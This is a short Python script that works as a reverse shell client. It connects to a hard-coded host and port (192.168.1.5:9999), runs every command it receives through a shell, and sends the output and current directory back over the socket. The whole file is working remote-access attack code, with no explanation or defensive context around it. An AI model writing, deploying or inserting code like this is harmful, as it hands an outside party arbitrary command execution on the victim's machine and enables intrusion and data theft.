import os
import subprocess
import socket

SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.5"
port = 9999

SOCKET.connect((host, port))

while True:
    data = SOCKET.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd =  subprocess.Popen(data.decode('utf-8'), shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,'utf-8')
        currentWD = os.getcwd() + "> "
        SOCKET.send(str.encode(output_str + currentWD))

        print(output_byte)



